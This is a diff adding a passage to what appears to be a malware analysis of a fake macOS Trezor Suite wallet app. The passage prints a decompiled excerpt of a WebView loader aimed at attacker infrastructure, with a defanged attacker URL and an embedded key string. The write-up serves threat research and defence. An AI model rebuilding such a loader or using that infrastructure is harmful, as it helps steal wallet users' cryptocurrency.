@@ -765,4 +765,17 @@ The most interesting element of the replaced Info,plist file are that the malici
     <key>ballfrank[.]today</key>
 ```
 
+The Trezor Suite application is then replaced with a binary which seemingly has no wallet functionality, but instead a WebView loader pointing at attacker infrastructure.
+
+```C
+100000b7c        _objc_storeStrong(location: &location_11, obj: applicationDidFinishLaunching)
+100000b8f        id (* const var_228)(id obj) = _objc_retain
+100000ba2        // hxxps[://]ballfrank[.]today/trezor/start/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
+100000ba2        id location_10 = _objc_retain(obj: &ballfrank.today/trezor URL)
+100000bb2        // 5190ef1733183a0dc63fb623357f56d6
+100000bb2        id location_9 = _objc_retain(obj: &API_Key_str)
+100000bd6        void (* const var_1a8)(void* self, char* cmd) = _objc_msgSend
+100000bdf        id location_8 = _objc_msgSend(
+100000bdf            self: _objc_alloc(cls: clsRef_WKWebViewConfiguration), cmd: "init")
+```
 
